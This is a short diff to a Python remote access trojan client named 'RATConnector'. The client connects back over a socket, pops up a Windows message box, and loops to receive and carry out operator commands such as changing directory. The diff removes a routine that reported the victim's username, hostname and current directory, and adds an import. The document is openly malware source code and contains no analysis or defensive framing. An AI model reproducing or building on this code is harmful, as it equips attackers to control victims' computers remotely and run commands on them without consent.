@@ -1,4 +1,4 @@
-import socket, subprocess, time, json, os, base64, ctypes, os, sys, getpass, platform
+import socket, subprocess, time, json, os, base64, requests, ctypes, os, sys
 
 ctypes.windll.user32.MessageBoxW(
     0,
@@ -24,10 +24,6 @@ class RATConnector:
     def dataSend(self, data):
         jsonData = json.dumps(data)
         self.connection.send(jsonData.encode())
-
-    def getHeader(self):
-        header = f"{getpass.getuser()}@{platform.node()}:{os.getcwd()}$"
-        self.dataSend(header)
 
     # Function for receiving data as JSON
     def dataReceive(self):
@@ -59,13 +55,12 @@ class RATConnector:
 
     def run(self):
         while True:
-            self.getHeader()
             command = self.dataReceive()
             try:
                 if command[0] == "exit":
                     self.connection.close()
                     sys.exit()
-                if command[0] == "ratHelp":
+                elif command[0] == "ratHelp":
                     commandResponse = ""
                 elif command[0] == "cd" and len(command) > 1:
                     os.chdir(command[1])
